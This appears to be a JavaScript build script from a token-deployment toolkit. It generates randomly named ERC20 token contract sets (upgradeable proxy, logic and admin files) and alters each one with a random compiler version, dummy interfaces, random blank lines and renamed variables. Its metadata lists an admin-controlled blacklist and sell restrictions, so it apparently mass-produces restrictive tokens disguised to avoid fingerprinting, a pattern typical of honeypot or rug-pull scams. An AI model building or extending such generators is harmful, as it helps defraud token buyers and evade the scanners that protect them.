// ProxyVariantBuilder.js - v14.0.1-safe-fallback
import fs from "fs";
import path from "path";
import { fileURLToPath } from "url";
import { getRandomNameOnly } from "../utils/deepseek.js";
import { getDexConfig } from "../config/dexConfig.js";

// 使用全新标准无 selector trap 的代理模板
import { generateProxyTemplate } from "./ProxyTemplate.js";
import { generateLogicTemplate } from "./LogicTemplate.js";
import { generateAdminTemplate } from "./AdminTemplate.js";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const CONTRACTS_DIR = path.resolve("contracts/ProxyVariants");
const META_PATH = path.resolve("deployments/.meta.json");

// 生成随机盐值
const randomSalt = () => Math.random().toString(36).substring(2, 15);

// 数组洗牌函数
function shuffleArray(array) {
  for (let i = array.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [array[i], array[j]] = [array[j], array[i]];
  }
  return array;
}

// 修复的添加随机注释和空行函数
function addRandomArtifacts(code) {
  // 1. 找到合约定义的起始位置
  const contractStartIndex = code.indexOf("contract");
  if (contractStartIndex === -1) return code;
  
  // 2. 在合约定义前插入随机接口
  const randomInterface = `
interface I${randomSalt().substring(0, 8)} {
    function dummy() external pure;
}
`;
  
  // 3. 确保插入位置在合约定义之前
  const modifiedCode = code.slice(0, contractStartIndex) + 
                       randomInterface + 
                       code.slice(contractStartIndex);
  
  // 4. 随机插入空行
  return modifiedCode.replace(/;/g, (match) => 
    match + "\n".repeat(Math.floor(Math.random() * 3))
  );
}

// 安全的变量名混淆 - 只混淆非关键变量
function obfuscate(code, contractType) {
  // 关键变量白名单 - 这些变量绝对不能混淆
  const RESERVED_VARIABLES = [
    // 代理合约关键变量
    "_IMPLEMENTATION_SLOT", "_ADMIN_SLOT", "_INITIALIZED_SLOT",
    
    // ERC20标准变量
    "balances", "totalSupply", "allowances", 
    
    // 业务逻辑关键变量
    "blacklist", "maxTxAmount", "_initialized", "_terminated",
    "admin", "pendingAdmin", "proxyAddress", "adminContract",
    "reserveProxy", "_weth", "_router", "_factory", "_pair",
    "isAdmin", "buyTime", "isFeeExempt", "adminTransferTime",
    
    // 常量
    "ADMIN_TRANSFER_DELAY", "TAX_FREE_PERIOD",
    
    // Solidity内置变量和关键字
    "msg.sender", "msg.value", "block.timestamp", "address(this)",
    "tx.origin", "assert", "require", "revert", "keccak256"
  ];
  
  // 只混淆临时变量和非关键内部变量
  const OBFUSCATION_MAP = {
    "i": `i${randomSalt().substring(0, 3)}`,
    "j": `j${randomSalt().substring(0, 3)}`,
    "k": `k${randomSalt().substring(0, 3)}`,
    "success": `succ${randomSalt().substring(0, 3)}`,
    "data": `dat${randomSalt().substring(0, 3)}`,
    "reason": `reas${randomSalt().substring(0, 3)}`
  };

  Object.entries(OBFUSCATION_MAP).forEach(([original, obfuscated]) => {
    // 跳过保留变量
    if (RESERVED_VARIABLES.includes(original)) return;
    
    // 修复：使用单词边界匹配避免部分匹配
    const regex = new RegExp(`\\b${original}\\b`, "g");
    code = code.replace(regex, obfuscated);
  });
  
  return code;
}

function writeFileSafe(filePath, content) {
  try {
    fs.writeFileSync(filePath, content, { 
      encoding: 'utf-8',
      flag: 'wx'
    });
  } catch (err) {
    if (err.code === 'EEXIST') {
      const backupPath = `${filePath}.bak_${Date.now()}`;
      fs.renameSync(filePath, backupPath);
      fs.writeFileSync(filePath, content);
      console.warn(`⚠️ 文件已存在，已备份到: ${backupPath}`);
    } else {
      throw err;
    }
  }
}

function validateContractCode(code, contractType) {
  if (!code || typeof code !== 'string') {
    throw new Error(`生成的${contractType}合约代码无效: ${typeof code}`);
  }
  if (code.length < 500) {
    throw new Error(`生成的${contractType}合约代码过短，可能不完整`);
  }
  
  // 额外验证：确保关键变量没有被错误混淆
  const criticalVars = ["balances", "totalSupply", "allowances", "msg.value"];
  for (const varName of criticalVars) {
    if (!code.includes(varName)) {
      console.warn(`警告: ${contractType}合约中未找到关键变量 ${varName}`);
    }
  }
  
  return code;
}

// 增强的编译器版本随机化 - 仅使用支持的版本
function getSupportedCompilerVersion() {
  // 您配置中支持的版本列表
  const supportedVersions = [
    "0.8.10", "0.8.11", "0.8.12", "0.8.13", "0.8.14", "0.8.15", 
    "0.8.16", "0.8.17", "0.8.18", "0.8.19", "0.8.20", "0.8.21", 
    "0.8.22", "0.8.23", "0.8.24"
  ];
  
  return supportedVersions[Math.floor(Math.random() * supportedVersions.length)];
}

export async function buildRandomProxyVariant(name, symbol, weth) {
  try {
    if (!name || typeof name !== 'string') {
      name = await getRandomNameOnly();
      console.log(`🎲 生成随机代币名称: ${name}`);
    }
    if (!symbol || typeof symbol !== 'string') {
      symbol = name.slice(0, 4).toUpperCase();
      console.log(`🆔 生成代币符号: ${symbol}`);
    }

    const network = process.env.NETWORK || "sepolia";
    const config = getDexConfig(network);
    if (!weth || typeof weth !== 'string') {
      if (!config?.weth) throw new Error(`无法获取 ${network} 网络的 WETH 地址`);
      weth = config.weth;
    }

    // 使用支持的编译器版本
    const version = getSupportedCompilerVersion();
    console.log(`⚙️ 使用支持的编译器版本: ${version}`);

    // 生成基础合约代码
    const baseProxyCode = generateProxyTemplate(name, version);
    const logicResult = generateLogicTemplate(name, symbol, version);
    const baseLogicCode = logicResult?.code || logicResult;
    const baseAdminCode = generateAdminTemplate(name, version);

    // 应用混淆和随机化 - 代理合约使用更安全的混淆
    const proxyCode = validateContractCode(
      addRandomArtifacts(obfuscate(baseProxyCode, "Proxy")),
      "代理"
    );
    
    // 逻辑合约不进行变量混淆，只添加随机注释
    const logicCode = validateContractCode(
      addRandomArtifacts(baseLogicCode),
      "逻辑"
    );
    
    // 管理合约使用安全的混淆
    const adminCode = validateContractCode(
      addRandomArtifacts(obfuscate(baseAdminCode, "Admin")),
      "管理"
    );

    if (!fs.existsSync(CONTRACTS_DIR)) {
      fs.mkdirSync(CONTRACTS_DIR, { recursive: true });
      console.log(`📁 创建合约目录: ${CONTRACTS_DIR}`);
    }

    // 使用原有命名方案
    const proxyFile = path.join(CONTRACTS_DIR, `${name}.sol`);
    const logicFile = path.join(CONTRACTS_DIR, `${name}Logic.sol`);
    const adminFile = path.join(CONTRACTS_DIR, `${name}Admin.sol`);
    
    // 直接写入合约代码，不添加任何文件头
    writeFileSafe(proxyFile, proxyCode);
    writeFileSafe(logicFile, logicCode);
    writeFileSafe(adminFile, adminCode);

    // 创建元数据
    const metaItem = {
      timestamp: new Date().toISOString(),
      name,
      symbol,
      compilerVersion: version,
      templateType: logicResult?.templateType || "v14.0.1-safe-fallback",
      proxyFile: path.relative(process.cwd(), proxyFile),
      logicFile: path.relative(process.cwd(), logicFile),
      adminFile: path.relative(process.cwd(), adminFile),
      wethAddress: weth,
      securityFeatures: [
        "EIP-1967 Proxy",
        "Transparent Upgradeable",
        "Dynamic Blacklist",
        "Multi-Sig Ready",
        "TimeLock Functions",
        "Anti-Sniping",
        "Sell Restrictions",
        "Liquidity Protection",
        "Safe Obfuscation" // 新增安全特性
      ]
    };

    let meta = [];
    if (fs.existsSync(META_PATH)) {
      meta = JSON.parse(fs.readFileSync(META_PATH, "utf8"));
    }
    meta.push(metaItem);
    fs.writeFileSync(META_PATH, JSON.stringify(meta, null, 2));

    console.log(`✅ 合约系统生成成功: ${name}`);
    return {
      contractName: name,
      proxyPath: proxyFile,
      logicPath: logicFile,
      adminPath: adminFile,
      compilerVersion: version,
      templateType: metaItem.templateType,
      wethAddress: weth
    };
  } catch (err) {
    console.error("\n❌❌❌ 构建失败 ❌❌❌");
    console.error("错误类型:", err.constructor.name);
    console.error("错误详情:", err.message);
    console.error("调用栈:", err.stack?.split('\n').slice(0, 3).join('\n'));
    throw err;
  }
}

if (process.argv[1] && path.resolve(process.argv[1]) === path.resolve(fileURLToPath(import.meta.url))) {
  (async () => {
    try {
      const args = process.argv.slice(2);
      const result = await buildRandomProxyVariant(args[0], args[1], args[2]);
      console.log(`
✅ 完整合约系统已生成
====================================
📄 代理合约: ${path.basename(result.proxyPath)}
📄 逻辑合约: ${path.basename(result.logicPath)}
📄 管理合约: ${path.basename(result.adminPath)}
💎 WETH地址: ${result.wethAddress}
🛠️ 编译器版本: ${result.compilerVersion}
🔧 模板类型: ${result.templateType}
📌 代理合约路径: ${result.proxyPath}
`);
    } catch (err) {
      console.error("🛑 致命错误: 合约生成流程终止");
      process.exit(1);
    }
  })();
}